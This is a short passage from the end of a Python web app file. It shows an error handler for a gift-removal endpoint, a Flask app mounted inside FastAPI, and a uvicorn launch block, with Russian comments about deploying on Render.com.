        
    except Exception as e:
        logging.error(f"Error removing gift: {e}")
        return jsonify({"error": "Internal server error"}), 500

# --- "Склеиваем" два приложения ---
# FastAPI будет обрабатывать /webhook, а всё остальное передавать в Flask
app.mount("/", WSGIMiddleware(flask_app))

if __name__ == '__main__':
    import uvicorn
    # Запуск через uvicorn, если файл запущен напрямую
    # Для Render.com используется gunicorn, он найдет 'app' автоматически
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)